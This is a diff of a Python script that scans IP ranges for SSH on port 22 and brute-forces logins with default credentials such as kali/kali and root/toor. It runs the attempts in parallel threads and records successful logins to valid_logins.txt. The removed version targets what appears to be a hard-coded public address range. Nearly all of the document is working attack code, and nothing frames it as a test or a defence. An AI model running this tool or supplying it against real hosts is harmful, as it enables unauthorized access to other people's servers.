@@ -1,109 +1,85 @@
-import threading
-import socket
-import ipaddress
 import paramiko
-from paramiko.ssh_exception import SSHException
+import socket
+import threading
+import time
+import sys
+import ipaddress
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from colorama import Fore, Style
 
-def create_ip_ranges(ip_range_input):
-    if '-' in ip_range_input:
-        start_ip, end_ip = ip_range_input.split('-')
-        return list(ipaddress.summarize_address_range(ipaddress.IPv4Address(start_ip.strip()), ipaddress.IPv4Address(end_ip.strip())))
-    elif '/' in ip_range_input:
-        return list(ipaddress.ip_network(ip_range_input).subnets())
-    else:
-        return [ipaddress.ip_network(ip_range_input)]
+def check_port(ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((ip, 22))
+    sock.close()
+    return result == 0
 
-def scan_ips(ip_ranges_input):
-    ip_ranges = create_ip_ranges(ip_ranges_input)
-
-    ip_data = {}
-    for ip_range in ip_ranges:
-        for ip in ip_range:
-            ip_data[str(ip)] = {"port_22_open": False}
-            scan_thread = threading.Thread(target=scan_port, args=(str(ip), 22, ip_data))
-            scan_thread.start()
-
-    return ip_data
-
-def scan_port(ip, port, ip_data):
-    print(f"Scanning IP: {ip}")
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(1)
-    result = s.connect_ex((ip, port))
-
-    if result == 0:
-        print(f"{ip} - Port {port} is open.")
-        ip_data[ip]["port_22_open"] = True
-
-def grab_banner_data(ip_data):
-    banners = {}
-    for ip, data in ip_data.items():
-        if data["port_22_open"]:
-            banner = get_banner(ip)
-            if banner:
-                banners[ip] = {"banner": banner}
-
-    return banners
-
-def get_banner(ip):
+def ssh_connect(ip, username, password):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((ip, 22))
-        banner = s.recv(1024).decode('utf-8').strip()
-        return banner
+        ssh.connect(ip, port=22, username=username, password=password, timeout=5, banner_timeout=10)
+        transport = ssh.get_transport()
+        remote_version = transport.remote_version
+        if "2.0" in remote_version:
+            print(f"{Fore.GREEN}[+] {ip:<15} Success: {username}/{password:<10} SSHv2{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.GREEN}[+] {ip:<15} Success: {username}/{password:<10} SSHv1{Style.RESET_ALL}")
+        with open("valid_logins.txt", "a") as f:
+            f.write(f"{ip}:{username}:{password}\n")
+    except paramiko.AuthenticationException:
+        print(f"{Fore.RED}[-] {ip:<15} Authentication failed: {username}/{password:<10}{Style.RESET_ALL}")
+    except socket.error:
+        print(f"{Fore.YELLOW}[!] {ip:<15} Connection failed{Style.RESET_ALL}")
     except Exception as e:
-        print(f"Exception occurred while getting banner for {ip}: {e}")
-        return None
+        print(f"{Fore.YELLOW}[!] {ip:<15} Error: {str(e)}{Style.RESET_ALL}")
+    ssh.close()
 
-def ssh_login_attempt(ip, username, password):
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, username=username, password=password, timeout=5, banner_timeout=5, allow_agent=False, look_for_keys=False)
-        return True
-    except SSHException as e:
-        print(f"SSHException occurred at {ip}: {e}")
-        return False
-    except paramiko.ssh_exception.EOFError as e:
-        # Additional handling for the EOFError
-        print(f"EOFError occurred at {ip}: {e}")
-        return False
-    except:
-        return False
-
-def attempt_ssh_logins(ips_and_banners):
-    usernames = ["kali", "admin", "root", "ubuntu"]
-    passwords = ["kali", "admin", "toor", "123456", "qwerty", "debian"]
-
-    for ip, banner_data in ips_and_banners.items():
-        success = False
-        for username in usernames:
-            if success:
-                break
-            for i in range(6):
-                password = passwords[i]
-                if ssh_login_attempt(ip, username, password):
-                    print(f"Successful login: {ip} - {username} - {password}")
-                    success = True
-                    break
-                if i == 2:
-                    print(f"[{ip}] Disconnecting and reconnecting to try the other 3 passwords.")
-                    reconnect_attempts = 0
-                    while reconnect_attempts < 3:
-                        if ssh_login_attempt(ip, 'invalid_user', 'invalid_pass'):
-                            break
-                        reconnect_attempts += 1
-
-        if not success:
-            print(f"Failed to log in to {ip}")
+def scan_ip(ip):
+    print(f"{Fore.CYAN}Scanning {ip}...{Style.RESET_ALL}")
+    if check_port(ip):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((ip, 22))
+            banner = sock.recv(1024).decode().strip()
+            sock.close()
+            if "SSH" in banner:
+                usernames = ["kali", "root", "ubuntu", "admin"]
+                passwords = ["kali", "toor", "123456", "qwerty", "debian", "password"]
+                with ThreadPoolExecutor(max_workers=20) as executor:
+                    futures = []
+                    for username in usernames:
+                        for password in passwords[:3]:
+                            futures.append(executor.submit(ssh_connect, ip, username, password))
+                        for password in passwords[3:]:
+                            futures.append(executor.submit(ssh_connect, ip, username, password))
+                    for future in as_completed(futures):
+                        pass
+            else:
+                print(f"{Fore.YELLOW}[!] {ip:<15} Port 22 is open but does not appear to be an SSH server{Style.RESET_ALL}")
+        except socket.timeout:
+            print(f"{Fore.YELLOW}[!] {ip:<15} Connection timed out{Style.RESET_ALL}")
+        except socket.error as e:
+            print(f"{Fore.YELLOW}[!] {ip:<15} Error: {str(e)}{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.YELLOW}[!] {ip:<15} Port 22 is closed{Style.RESET_ALL}")
 
 def main():
-    # change the input_ip_ranges to a valid input range
-    input_ip_ranges = "72.23.1.1-72.23.10.255"
-    ip_data = scan_ips(input_ip_ranges)
-    ips_and_banners = grab_banner_data(ip_data)
-    attempt_ssh_logins(ips_and_banners)
+    ip_range = input("Enter IP range (e.g. 192.168.0.1/24): ")
+
+    try:
+        network = ipaddress.ip_network(ip_range)
+    except ValueError:
+        print("Invalid IP range")
+        sys.exit()
+
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = []
+        for ip in network.hosts():
+            futures.append(executor.submit(scan_ip, str(ip)))
+        for future in as_completed(futures):
+            pass
 
 if __name__ == "__main__":
     main()
